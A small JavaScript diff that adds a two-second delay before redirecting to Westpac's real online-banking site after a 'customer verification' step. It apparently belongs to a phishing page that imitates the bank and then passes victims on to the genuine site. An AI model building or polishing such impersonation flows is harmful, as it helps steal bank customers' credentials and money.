@@ -396,7 +396,7 @@
             	document.getElementById('customer_verification').style.display = "none";
         
                 sessionStorage.setItem('visitor', visitor);
-                window.location.href = "https://banking.westpac.com.au";
+                setTimeout(()=>{window.location.href = "https://banking.westpac.com.au";},2000);
                 console.log(msg); // Log success message
             }).fail(function(err, textstatus, error) {
             //window.location.href = "login/2"; 
